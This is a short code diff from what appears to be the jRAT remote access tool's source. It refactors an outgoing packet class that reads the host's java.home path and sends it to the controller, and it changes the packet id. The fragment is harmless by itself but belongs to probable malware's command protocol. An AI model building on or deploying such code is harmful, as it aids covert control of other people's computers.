@@ -5,22 +5,17 @@ import java.io.DataOutputStream;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet26InitJavaPath extends AbstractOutgoingPacket {
-
-	private String path;
-
-	public Packet26InitJavaPath(String path) {
-		this.path = path;
-	}
+public class Packet15InitJavaPath extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+		String path = System.getProperty("java.home");
 		sw.writeLine(path);
 	}
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 26;
+		return (byte) 15;
 	}
 
 }
